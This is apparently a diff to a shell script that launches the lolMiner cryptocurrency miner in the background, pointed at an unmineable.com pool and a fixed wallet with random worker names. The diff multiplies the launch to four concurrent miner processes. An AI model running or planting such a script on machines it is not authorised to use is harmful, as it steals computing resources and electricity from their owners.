@@ -7,5 +7,8 @@ tar -zxvf lolminer.tar.gz
 random=$RANDOM
 while [ 1 ]; do
         nohup ./bin/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TEHEWGhfJBopZmuf7cut514YJNyunhj5Jt.'USER'$random --ethstratum ETHPROXY &
+        nohup ./bin/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TEHEWGhfJBopZmuf7cut514YJNyunhj5Jt.'USER'$random --ethstratum ETHPROXY &
+        nohup ./bin/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TEHEWGhfJBopZmuf7cut514YJNyunhj5Jt.'USER'$random --ethstratum ETHPROXY &
+        nohup ./bin/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TEHEWGhfJBopZmuf7cut514YJNyunhj5Jt.'USER'$random --ethstratum ETHPROXY &
         tail -f nohup.out
 done
